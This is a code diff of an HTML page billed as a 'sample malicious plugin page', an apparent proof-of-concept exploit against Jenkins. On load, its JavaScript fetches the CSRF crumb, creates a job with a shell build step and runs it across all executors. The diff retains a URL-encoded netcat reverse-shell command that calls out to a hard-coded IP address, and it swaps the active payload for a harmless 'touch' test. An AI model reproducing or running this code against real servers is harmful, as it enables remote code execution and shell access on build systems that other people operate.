@@ -3,7 +3,7 @@ getCrumb will work only under the same domain (so it must be used VIA XSS or oth
 So if you want to host script on some phishy domain, it will work only on jenkins without CSRF protection enabled 
 -->
 <html>
-  <body onload="sendPayload('ZN_BUILD_Shell','lol','http://192.168.0.14:8080')">
+  <body onload="sendPayload('CONF_BUILD_Shell','lol','http://192.168.100.8:8080')">
     <div>
       Sample malicious plugin page
       <p>Your crumb is:<div id="crumb"></div></p>
@@ -15,7 +15,6 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           xhttp.send();
           return xhttp.responseText;
           }
-
         function createJob(name, host){
           var crumb = getCrumb(host).substring(7);
           document.getElementById("crumb").innerHTML = crumb;
@@ -28,7 +27,6 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           xhttp.send(data);
         }
-
         function addBuildStep(name, payload, host){
           var crumb = getCrumb().substring(7);
           document.getElementById("crumb").innerHTML = crumb;
@@ -41,13 +39,11 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           var buildClass = "stapler-class=" + "hudson.tasks.Shell";
           var buildWTF2 = "core:apply=" + "";
           var buildJSON = '{"name":"' + name + '","description":"' + "" + '", "logrotate": false, "": "0", "buildDiscarder": {"daysToKeepStr": "", "numToKeepStr": "", "artifactDaysToKeepStr": "", "artifactNumToKeepStr": "", "stapler-class": "hudson.tasks.LogRotator", "$class": "hudson.tasks.LogRotator"}, "properties": {"stapler-class-bag": "true", "hudson-security-AuthorizationMatrixProperty": {}, "com-coravy-hudson-plugins-github-GithubProjectProperty": {"projectUrl": ""}, "hudson-model-ParametersDefinitionProperty": {}}, "disable": false, "concurrentBuild": false, "hasCustomQuietPeriod": false, "quiet_period": "5", "hasCustomScmCheckoutRetryCount": false, "scmCheckoutRetryCount": "0", "blockBuildWhenUpstreamBuilding": false, "blockBuildWhenDownstreamBuilding": false, "hasCustomWorkspace": false, "customWorkspace": "", "displayNameOrNull": "", "scm": {"value": "0"}, "builder":{"command":"' + payload + '", "": "' + payload + '", "stapler-class": "hudson.tasks.Shell", "$class": "hudson.tasks.Shell"},"core:apply": "",".crumb":"' + crumb + '"}'
-
           var data = buildName + "&" + buildDescription + "&" + iDoNotKnowWhatTheseAreDoing + "&" +buildCommand + "&" + buildClass + "&" + buildWTF2 + "&" +buildCrumb + "&json=" + buildJSON;
           xhttp.open('POST', host + '/job/' + name + '/configSubmit', true);
           xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           xhttp.send(data);
         }
-
         function rubBuild(name, host){
           var crumb = getCrumb(host).substring(7);
           var xhttp = new XMLHttpRequest();
@@ -57,13 +53,25 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           xhttp.send(data);
         }
-
         function sendPayload(name, payload, host){
-          var Payload = "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.0.13+8888+1%3E%2Ftmp%2Fbackpipe";
+          var shell "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.0.13+8888+1%3E%2Ftmp%2Fbackpipe"
+          var Payload = "touch ./AZAZAZA";
           createJob(name, host);
           addBuildStep(name, Payload, host);
-          rubBuild(name,host);
+          executors = getExecutors(host)
+          alert(executors)
+          for(i=0; i< executors; i++){
+            rubBuild(name,host);
+          }
           document.getElementById("result").innerHTML = "Shell uploaded succesfully";
+        }
+        function getExecutors(host){
+          var xhttp = new XMLHttpRequest();
+          xhttp.open('GET', '/computer/api/xml?depth=1', false);
+          xhttp.send();
+          parser = new DOMParser();
+          xmlDoc = parser.parseFromString(xhttp.responseText, "text/xml");          
+          return xmlDoc.getElementsByTagName('computer').length
         }
       </script>
     </div>
